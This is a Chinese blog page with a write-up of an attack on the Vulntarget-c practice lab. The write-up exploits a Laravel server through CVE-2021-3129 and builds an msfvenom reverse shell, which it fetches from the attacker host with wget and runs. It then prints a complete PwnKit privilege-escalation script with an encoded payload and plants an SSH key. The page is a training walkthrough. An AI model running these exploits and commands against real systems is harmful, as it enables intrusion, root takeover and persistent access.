@@ -1,0 +1,981 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/favicon.jpg">
+  <link rel="icon" href="/img/favicon/favicon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="BadWolf">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="本篇为域渗透环境Vulntarget-c渗透记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulntarget靶场渗透之Vulntarget-c">
+<meta property="og:url" content="https://genioco.github.io/2023/08/09/hacking/Vulntarget%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BVulntarget-c/index.html">
+<meta property="og:site_name" content="BadWolf&#39;s Blog">
+<meta property="og:description" content="本篇为域渗透环境Vulntarget-c渗透记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/frlzRFNGnWcAOJX.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/hrPjsZDGLuVaNFo.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/GwVuBtDPIJ1X9AN.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/T8qjIFLDudJfPsm.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/xzgKXBkEi5e2tIw.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/cgN46kKuBeOGlSy.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/yUCiVbIujAKxRrz.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/pmQjIa7fLdyY1TX.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/4RPl3kbyXnONHaU.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/EtCQl2AihXFuqyd.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/2ow6u8eZpJhcRQO.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/MaJoDrC2UN6ejsb.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/NkOAs3XhTcod9rV.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/4dyTn6ebVOpU1FW.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/l7P51DkJAGWYzaX.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/6HrDYSXhJt9znGP.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/dNISY9JXoi8zZgL.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/7kPYn9uBUVgbeLx.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/NSn27boQCFVDOuH.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/bad15ab3ce7548beaa7b4252a8031368.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/jtpyoZEBV54SNf8.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/Cye48wKkq5uWvZh.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/V8z2BNb6HGIqcPM.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/e8mZiqwTztoQf9D.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/wxyAqHIlYmaXE9f.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/fvbup9sGrxi63kg.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/2vn8FLCZStwRWkV.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/1e9rhHfMWujGS7U.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/U9KnVyY5vaxHCWu.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/F1ObpWyxCmjBwhq.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/aiS36JVhkFgsPRH.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/3V4Z7NDq6EHKW2b.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/puZdYLVyaj3JRz1.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/fd8koxcbBSQyqRM.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/EJmu3Xi9Ul8PxzV.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/cMNOGD8zy123VmJ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/08/efrZtD2d5SJPUbh.png">
+<meta property="article:published_time" content="2023-08-09T05:14:00.000Z">
+<meta property="article:modified_time" content="2023-10-10T05:14:00.000Z">
+<meta property="article:author" content="BadWolf">
+<meta property="article:tag" content="靶场">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2022/08/08/frlzRFNGnWcAOJX.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Vulntarget靶场渗透之Vulntarget-c - BadWolf&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/js/shubiao.css">
+<link rel="stylesheet" href="/js/scroll.css">
+<link rel="stylesheet" href="/js/gradient.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"genioco.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":80,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"839133d5bbdb7688edec52dfcde2a75b","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?839133d5bbdb7688edec52dfcde2a75b";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>BadWolf&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Vulntarget靶场渗透之Vulntarget-c"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        BadWolf
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-09 13:14" pubdate>
+          2023年8月9日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Vulntarget靶场渗透之Vulntarget-c</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    <!-- compatible with older versions-->
+                    本文最后更新于：2023年10月10日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <meta name="referrer" content="no-referrer">
+
+
+
+<h2 id="Vulntarget靶场渗透之Vulntarget-c"><a href="#Vulntarget靶场渗透之Vulntarget-c" class="headerlink" title="Vulntarget靶场渗透之Vulntarget-c"></a><strong>Vulntarget靶场渗透之Vulntarget-c</strong></h2><h3 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg3NDYwNjQyMw==&mid=2247487964&idx=1&sn=0d85012c9b262f57f574219b5fbbb32b&chksm=cecf6be4f9b8e2f2582540de2e947d39f63f6d533046febd0566af378f3b4a8560d2c13e4a9b&scene=178&cur_album_id=2109154452740866051#rd">vulntarget漏洞靶场系列（三）— vulntarget-c</a></p>
+<p>网络拓扑：</p>
+<p><img src="https://s2.loli.net/2022/08/08/frlzRFNGnWcAOJX.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>ubuntu20:root&#x2F;root#qwe</p>
+<p>win2016:</p>
+<p>ubuntu16:</p>
+<h3 id="初始配置"><a href="#初始配置" class="headerlink" title="初始配置"></a>初始配置</h3><p>ubuntu20靶机初始网络连接为静态连接，因此我们需要配置为dhcp才能正常访问，使用<code>ip a</code>，查看网络信息。</p>
+<p>修改配置文件</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">vim</span> /etc/netplan/<span class="hljs-number">00</span>-installer-config.yaml<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/08/hrPjsZDGLuVaNFo.png" srcset="/img/loading.gif" lazyload alt="image-20220622135901500"></p>
+<p>启用配置文件</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">netplan <span class="hljs-built_in">apply</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/08/GwVuBtDPIJ1X9AN.png" srcset="/img/loading.gif" lazyload alt="image-20220622135619549"></p>
+<p><img src="https://s2.loli.net/2022/08/08/T8qjIFLDudJfPsm.png" srcset="/img/loading.gif" lazyload alt="image-20220622140021389"></p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><strong>端口扫描</strong></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -p- -Pn -T4 <span class="hljs-number">192.168.56.133</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/08/xzgKXBkEi5e2tIw.png" srcset="/img/loading.gif" lazyload alt="image-20220622141703401"></p>
+<p><strong>目录扫描</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirsearch -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.133</span> -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>fuzzDicts<span class="hljs-regexp">/directoryDicts/</span>Filenames_or_Directories_All.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/08/cgN46kKuBeOGlSy.png" srcset="/img/loading.gif" lazyload alt="image-20220623070908601"></p>
+<p>访问80端口，发现是Laravel框架，直接百度Laravel漏洞。</p>
+<p><img src="https://s2.loli.net/2022/08/08/yUCiVbIujAKxRrz.png" srcset="/img/loading.gif" lazyload alt="image-20220623065554257"></p>
+<h3 id="Laravel-getshell"><a href="#Laravel-getshell" class="headerlink" title="Laravel getshell"></a>Laravel getshell</h3><p>搜索漏洞信息</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">searchsploit Laravel</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/08/pmQjIa7fLdyY1TX.png" srcset="/img/loading.gif" lazyload alt="image-20220623074243418"></p>
+<p>似乎searchsploit的exp有些问题，所以在github重新找了一个exp。</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/SNCKER/CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">3129</span><br>cd CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">3129</span><br>git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/ambionics/phpggc.git（exp执行需要使用此工具)<br></code></pre></td></tr></table></figure>
+
+<p>修改exploit的目标信息为192.168.56.133，执行命令id。</p>
+<p><img src="https://s2.loli.net/2022/08/08/4RPl3kbyXnONHaU.png" srcset="/img/loading.gif" lazyload alt="image-20220623081330764"></p>
+<p><img src="https://s2.loli.net/2022/08/08/EtCQl2AihXFuqyd.png" srcset="/img/loading.gif" lazyload alt="image-20220725141333885"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p><strong>生成木马</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/shell_reverse_tcp  <span class="hljs-attribute">LHOST</span>=192.168.56.105 <span class="hljs-attribute">LPORT</span>=6666 -f elf -o 6666.elf<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/08/2ow6u8eZpJhcRQO.png" srcset="/img/loading.gif" lazyload alt="image-20220725165022023"></p>
+<p>遍历目录，可以看到网站目录为<code>/var/www/html/public</code>，也可以直接使用<code>/tmp/</code>下载木马，其他目录可能权限不足。</p>
+<p><img src="https://s2.loli.net/2022/08/08/MaJoDrC2UN6ejsb.png" srcset="/img/loading.gif" lazyload alt="image-20220725160925680"></p>
+<p>获得shell。</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> exploit.<span class="hljs-keyword">py</span> <span class="hljs-string">&quot;cd /tmp/&amp;&amp;wget http://192.168.56.105/6666.elf&amp;&amp;chmod 777 6666.elf&amp;&amp;./6666.elf&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/08/NkOAs3XhTcod9rV.png" srcset="/img/loading.gif" lazyload alt="image-20220725165140129"></p>
+<p>先给shell升级一下，用着好用。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">TERM</span>=xterm<br>Ctrl+z快捷键<br>stty<span class="hljs-built_in"> raw </span>-echo;fg<br>reset<br></code></pre></td></tr></table></figure>
+
+<p>下载linpeas.sh简单查看一下信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://192.168.56.105/linpeas.sh&amp;&amp;<span class="hljs-built_in">chmod</span> 777 ./linpeas.sh&amp;&amp;./linpeas.sh<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/08/4dyTn6ebVOpU1FW.png" srcset="/img/loading.gif" lazyload alt="image-20220725180501956"></p>
+<p>suid权限中发现pkexec文件。</p>
+<h3 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h3><p>使用pkexec.py提权</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-comment"># poc for https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt found by qualys</span><br><span class="hljs-comment"># hardcoded amd64 lib</span><br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes.util <span class="hljs-keyword">import</span> find_library<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> tempfile<br><br>payload = zlib.decompress(<br>   base64.b64decode(<br>       <span class="hljs-string">&quot;&quot;&quot;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&quot;&quot;&quot;</span><br>  )<br>)<br>libc = CDLL(find_library(<span class="hljs-string">&quot;c&quot;</span>))<br>libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)<br>libc.execve.restype = c_ssize_t<br><br>wd = tempfile.mkdtemp()<br><span class="hljs-built_in">open</span>(wd + <span class="hljs-string">&quot;/pwn.so&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>).write(payload)<br>os.mkdir(wd + <span class="hljs-string">&quot;/gconv/&quot;</span>)<br><span class="hljs-built_in">open</span>(wd + <span class="hljs-string">&quot;/gconv/gconv-modules&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>).write(<br>   <span class="hljs-string">&quot;module UTF-8//   INTERNAL   ../pwn   2&quot;</span><br>)<br>os.mkdir(wd + <span class="hljs-string">&quot;/GCONV_PATH=.&quot;</span>)<br>os.mknod(wd + <span class="hljs-string">&quot;/GCONV_PATH=./gconv&quot;</span>)<br>os.chmod(wd + <span class="hljs-string">&quot;/GCONV_PATH=.&quot;</span>, <span class="hljs-number">0o777</span>)<br>os.chmod(wd + <span class="hljs-string">&quot;/GCONV_PATH=./gconv&quot;</span>, <span class="hljs-number">0o777</span>)<br>os.chmod(wd + <span class="hljs-string">&quot;/pwn.so&quot;</span>, <span class="hljs-number">0o777</span>)<br>os.chdir(wd)<br>cmd = <span class="hljs-string">b&quot;/usr/bin/pkexec&quot;</span><br>argv = []<br>envp = [<br>   <span class="hljs-string">b&quot;gconv&quot;</span>,<br>   <span class="hljs-string">b&quot;PATH=GCONV_PATH=.&quot;</span>,<br>   <span class="hljs-string">b&quot;LC_MESSAGES=en_US.UTF-8&quot;</span>,<br>   <span class="hljs-string">b&quot;XAUTHORITY=../gconv&quot;</span>,<br>   <span class="hljs-string">b&quot;&quot;</span>,<br>]<br><br>cargv = (c_char_p * (<span class="hljs-built_in">len</span>(argv) + <span class="hljs-number">1</span>))(*argv, <span class="hljs-literal">None</span>)<br>cenv = (c_char_p * (<span class="hljs-built_in">len</span>(envp) + <span class="hljs-number">1</span>))(*envp, <span class="hljs-literal">None</span>)<br>libc.execve(cmd, cargv, cenv)<br></code></pre></td></tr></table></figure>
+
+<p>直接写入ssh公钥免密登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://192.168.56.105/id_rsa.pub <br><span class="hljs-built_in">cat</span> id_rsa.pub &gt;authorized_keys<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/08/l7P51DkJAGWYzaX.png" srcset="/img/loading.gif" lazyload alt="image-20220725182705658"></p>
+<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><p><code>ipconfig</code>可以看到存在内网ip</p>
+<p><img src="https://s2.loli.net/2022/08/08/6HrDYSXhJt9znGP.png" srcset="/img/loading.gif" lazyload alt="image-20220725202859029"></p>
